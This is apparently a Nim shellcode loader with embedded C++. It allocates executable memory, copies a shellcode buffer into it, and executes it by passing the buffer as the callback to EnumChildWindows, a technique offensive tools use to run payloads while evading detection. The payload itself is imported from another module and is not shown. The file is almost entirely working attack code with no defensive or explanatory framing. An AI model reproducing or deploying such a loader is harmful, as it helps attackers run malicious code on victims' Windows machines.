import public

{.emit: """

int EnumChildWindowsNim(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);

    ::EnumChildWindows(NULL, (WNDENUMPROC)addr, NULL);
}
"""
.}

proc EnumChildWindowsNim(plainBuffer:cstring,size:cint):cint {.importcpp:"EnumChildWindowsNim(@)",nodecl.}

discard EnumChildWindowsNim(code,codelen)